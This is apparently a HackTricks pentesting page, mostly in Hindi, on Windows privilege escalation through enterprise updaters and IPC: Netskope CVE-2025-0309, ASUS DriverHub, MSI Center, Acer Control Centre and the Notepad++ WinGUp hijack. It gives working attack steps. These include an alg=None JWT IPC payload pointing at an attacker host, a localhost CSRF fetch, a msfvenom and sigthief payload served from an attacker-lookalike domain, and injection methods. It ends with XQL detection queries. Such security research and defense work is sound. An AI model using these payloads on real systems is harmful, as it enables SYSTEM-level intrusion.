# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन Windows लोकल प्रिविलेज़ एस्केलेशन चेनों को सामान्यीकृत करता है जो एंटरप्राइज़ endpoint agents और updaters में मिलते हैं, जो एक low-friction IPC surface और एक privileged update flow एक्सपोज़ करते हैं। एक प्रतिनिधि उदाहरण Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक low-privileged user attacker-controlled server में enrollment जाने के लिए मजबूर कर सकता है और फिर एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM service इंस्टॉल कर देती है।

Key ideas you can reuse against similar products:
- एक privileged service के localhost IPC का दुरुपयोग कर re-enrollment या reconfiguration को attacker server की ओर मजबूर करें।
- vendor’s update endpoints को implement करें, एक rogue Trusted Root CA दें, और updater को एक malicious, “signed” package की ओर इंगित करें।
- weak signer checks (CN allow-lists), optional digest flags, और lax MSI properties से बचें।
- यदि IPC “encrypted” है, तो registry में स्टोअर world-readable machine identifiers से key/IV derive करें।
- यदि service callers को image path/process name के द्वारा सीमित करती है, तो allow-listed process में inject करें या किसी process को suspended स्थिति में spawn करें और minimal thread-context patch के माध्यम से अपना DLL bootstrap करें।

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user-mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सर्विस enrollment/config के लिए आपके rogue server से संपर्क करना शुरू कर देती है, उदाहरण के लिए:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- यदि caller verification path/name-आधारित है, तो request को एक allow-listed vendor binary से originate करें (देखें §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

एक बार क्लाइंट आपके सर्वर से बात करने लगे, अपेक्षित endpoints को implement करें और इसे एक attacker MSI की ओर मोड़ें। सामान्य क्रम:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA प्रमाणपत्र लौटाता है। सेवा इसे Local Machine Trusted Root store में इंस्टॉल कर देती है.
3) /v2/checkupdate → ऐसे metadata सप्लाई करें जो एक malicious MSI और एक fake version की ओर इशारा करते हों।

वाइल्ड में आमतौर पर देखे जाने वाले चेक्स को बायपास करना:
- Signer CN allow-list: सेवा केवल यह जाँच सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA उस CN के साथ एक leaf जारी कर सकता है और MSI पर साइन कर सकता है।
- CERT_DIGEST property: एक सामान्य MSI property CERT_DIGEST नाम से शामिल करें। इंस्टॉल के समय इसका कोई प्रवर्तन नहीं होता।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) अतिरिक्त cryptographic validation को डिसेबल कर देता है।

परिणाम: SYSTEM सेवा आपके MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से इंस्टॉल कर arbitrary code को NT AUTHORITY\SYSTEM के रूप में execute कर देगी।

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope ने IPC JSON को encryptData फ़ील्ड में रैप किया जो Base64 जैसा दिखता है। रिवर्सिंग से पता चला कि AES का key/IV ऐसे रजिस्ट्री मानों से निकाला गया है जिन्हें कोई भी उपयोगकर्ता पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

हमलावर encryption को reproduce कर सकते हैं और एक standard user से मान्य encrypted commands भेज सकते हैं। सामान्य टिप: अगर कोई agent अचानक अपने IPC को “encrypt” करता है, तो material के रूप में HKLM के अंदर device IDs, product GUIDs, install IDs जैसी values खोजें।

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

कुछ सेवाएँ peer को authenticate करने के लिए TCP कनेक्शन का PID resolve करके image path/name की तुलना allow-listed vendor binaries से करती हैं जो Program Files के अंतर्गत स्थित होते हैं (उदा., stagentui.exe, bwansvc.exe, epdlp.exe)।

दो व्यावहारिक बायपास:
- allow-listed process में DLL injection (उदा., nsdiag.exe) और उसके अंदर से IPC को प्रॉक्सी करें।
- एक allow-listed binary को suspended के रूप में spawn करें और CreateRemoteThread का उपयोग किए बिना अपना proxy DLL bootstrap करें (देखें §5) ताकि driver-enforced tamper नियमों को पूरा किया जा सके।

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products अक्सर एक minifilter/OB callbacks driver (उदा., Stadrv) के साथ आते हैं जो protected processes के handles से खतरनाक rights हटा देता है:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

इन प्रतिबंधों का सम्मान करने वाला एक विश्वसनीय user-mode loader:
1) CreateProcess के माध्यम से vendor binary को CREATE_SUSPENDED के साथ बनाएं।
2) वे हैंडल हासिल करें जो आपको अभी भी दिए गए हैं: PROCESS_VM_WRITE | PROCESS_VM_OPERATION प्रोसेस पर, और एक thread handle के लिए THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या यदि आप किसी ज्ञात RIP पर कोड patch कर रहे हैं तो केवल THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed-mapped thunk) को एक छोटे stub से ओवरराइट करें जो आपकी DLL path पर LoadLibraryW कॉल करे, फिर वापस jump कर दे।
4) ResumeThread करके अपने stub को इन-प्रोसेस ट्रिगर करें, जिससे आपकी DLL लोड हो जाए।

क्योंकि आपने पहले से-protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे बनाया), driver की policy संतुष्ट हो जाती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing को automate करता है और आवश्यक endpoints सर्व करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope एक custom IPC client है जो arbitrary (optionally AES-encrypted) IPC messages बनाता है और suspended-process injection शामिल करता है ताकि यह allow-listed binary से originate करे।

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub एक user-mode HTTP service (ADU.exe) को 127.0.0.1:53000 पर चलाता है जो browser calls को अपेक्षित करता है जो https://driverhub.asus.com से आ रहे हों। origin filter केवल Origin header और `/asus/v1.0/*` द्वारा एक्सपोज़ किए download URLs पर `string_contains(".asus.com")` लागू करता है। इसलिए कोई भी attacker-controlled host जैसे `https://driverhub.asus.com.attacker.tld` यह चेक पास कर जाता है और JavaScript से state-changing requests भेज सकता है। अधिक बाइपास पैटर्न के लिए देखें [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)।

व्यवहारिक प्रवाह:
1) एक ऐसा डोमेन रजिस्टर करें जिसमें `.asus.com` embedded हो और वहां एक malicious webpage होस्ट करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर किसी privileged endpoint (उदा., `Reboot`, `UpdateApp`) को कॉल करें।
3) handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS नीचे schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
नीचे दिखाया गया PowerShell CLI भी तब सफल होता है जब Origin header को विश्वसनीय मान में spoofed किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
इसलिए किसी भी ब्राउज़र विज़िट का हमलावर साइट पर होना एक 1‑क्लिक (या `onload` के जरिए 0‑क्लिक) local CSRF बन जाता है जो एक SYSTEM helper को चला देता है।

---
## 2) असुरक्षित code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में परिभाषित arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation वही substring logic reuse करता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार किया जाता है। डाउनलोड के बाद, ADU.exe केवल यह चेक करता है कि PE में signature मौजूद है और Subject string ASUS से मेल खाती है पहले कि वह इसे चलाए – कोई `WinVerifyTrust`, कोई chain validation नहीं।

To weaponize the flow:
1) एक payload बनाएं (उदा., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) ASUS का signer उसमें clone करें (उदा., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को .asus.com जैसी दिखने वाली डोमेन पर host करें और ऊपर बताए ब्राउज़र CSRF के जरिए UpdateApp को trigger करें।

चूँकि Origin और URL filters substring‑based हैं और signer check केवल strings की तुलना करता है, DriverHub हमलावर बाइनरी को अपने elevated context में pull और execute कर लेता है।

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP प्रोटोकॉल एक्सपोज़ करती है जहाँ हर frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। कोर component (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` भेजता है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के जरिए signature verify करता है (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” के बराबर होना चाहिए और `WinVerifyTrust` सफल होना चाहिए)।
3) एक scheduled task बनाता है जो temp फ़ाइल को SYSTEM के रूप में attacker-controlled arguments के साथ चलाता है।

कॉपी की गई फ़ाइल verification और `ExecuteTask()` के बीच लॉक नहीं होती। एक हमलावर कर सकता है:
- Frame A भेजे जो किसी legitimate MSI-signed binary की ओर इशारा करता है (इससे signature check पास होता है और task queue हो जाता है)।
- इसे repeated Frame B संदेशों से race करें जो एक malicious payload की ओर इशारा करते हैं, और verification पूरा होते ही `MSI Center SDK.exe` को overwrite कर दें।

जब scheduler चलता है, तो यह overwrite की गई payload को SYSTEM के तहत execute कर देता है भले ही मूल फ़ाइल validate की गई थी। भरोसेमंद exploitation के लिए दो goroutines/threads का उपयोग किया जाता है जो CMD_AutoUpdateSDK को spam करते हैं जब तक TOCTOU विंडो जीत न जाए।

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा लोड की जाने वाली हर plugin/DLL को एक Component ID मिलता है जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` के तहत स्टोर होता है। एक frame के पहले 4 बाइट्स उस component को चुनते हैं, जिससे attackers arbitrary modules को commands route कर सकते हैं।
- Plugins अपने task runners define कर सकते हैं। `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` एक्सपोज़ करता है और सीधे `API_Support.EX_Task::ExecuteTask()` को कॉल करता है जिसमें **कोई signature validation नहीं** है – कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` की ओर पॉइंट कर के deterministic रूप से SYSTEM execution पा सकता है।
- Loopback को Wireshark से sniff करना या .NET बाइनरीज़ को dnSpy में instrument करना जल्दी से Component ↔ command मैपिंग दिखा देता है; कस्टम Go/ Python clients फिर frames replay कर सकते हैं।

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` एक्सपोज़ करता है, और उसकी discretionary ACL remote clients (उदा., `\\TARGET\pipe\treadstone_service_LightMode`) की अनुमति देती है। command ID `7` के साथ फ़ाइल पाथ भेजने पर सर्विस का process-spawning routine invoke होता है।
- क्लाइंट लाइब्रेरी args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` के साथ dynamic instrumentation (instrumentation tips के लिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) देखें) दिखाती है कि native handler इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में मैप करता है इससे पहले कि `CreateProcessAsUser` को कॉल किया जाए।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch में चला जाता है जो full SYSTEM token बनाए रखता है और उच्च‑integrity SID (`S-1-16-12288`) सेट करता है। spawned binary इसलिए बिना प्रतिबंध के SYSTEM के रूप में चलता है, स्थानीय और cross‑machine दोनों पर।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ combine करें ताकि ACC लैब VMs पर भी खड़ा किया जा सके और बिना vendor हार्डवेयर के pipe का परीक्षण किया जा सके।

ये IPC बग दिखाते हैं कि localhost सेवाओं को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू क्यों करनी चाहिए और क्यों हर मॉड्यूल का “run arbitrary binary” helper एक ही signer verification साझा करना चाहिए।

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

पुराने WinGUp‑based Notepad++ updaters ने update authenticity की पूरी तरह से पडताल नहीं की। जब हमलावरों ने update server के hosting provider को compromise किया, तो वे XML manifest को बदल सकते थे और चुने हुए क्लाइंट्स को attacker URLs पर redirect कर सकते थे। चूंकि क्लाइंट किसी भी HTTPS response को तब स्वीकार कर लेता था जब तक कि दोनों — trusted certificate chain और valid PE signature — कठोर रूप से लागू न किए गए हों, पीड़ितों ने trojanized NSIS `update.exe` को fetch और execute कर लिया।

Operational flow (कोई local exploit आवश्यक नहीं):
1. Infrastructure interception: CDN/hosting compromise करें और update checks का जवाब attacker metadata के साथ दें जो एक malicious download URL की ओर इशारा करता है।
2. Trojanized NSIS: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसकी search path में एक malicious `log.dll` रखें। जब signed binary चलेगा, Windows `log.dll` को sideload करता है, जो Chrysalis backdoor को decrypt और reflectively load करता है (Warbird‑protected + API hashing से static detection को कठिन किया गया)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है जो Win32 APIs (उदा., `EnumWindowStationsW`) का उपयोग कर shellcode inject करता है और Cobalt Strike Beacon को stage करता है।

किसी भी auto-updater के लिए Hardening/detection takeaways:
- डाउनलोड किए गए installer का **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest को स्वयं sign करें (उदा., XMLDSig)। manifest‑controlled redirects को तब तक block करें जब तक वे validated न हों।
- BYO signed binary sideloading को post‑download detection pivot के रूप में व्यवहार करें: alert करें जब कोई signed vendor EXE canonical install path के बाहर से किसी DLL नाम को लोड करे (उदा., Bitdefender `log.dll` को Temp/Downloads से लोड कर रहा हो) और जब updater temp में installers drop/execute करे जिनके non‑vendor signatures हों।
- इस chain में देखे गए **malware‑specific artifacts** को मॉनिटर करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, असामान्य `gup.exe` writes to `%TEMP%`, और Lua‑driven shellcode injection stages।

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ के अलावा किसी अन्य इंस्टॉलर को लॉन्च कर रहा है</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये पैटर्न किसी भी updater पर सामान्य होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में नाकाम रहता है — network hijack + malicious installer + BYO-signed sideloading से remote code execution मिलता है, जो “trusted” updates के बहाने होता है।

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
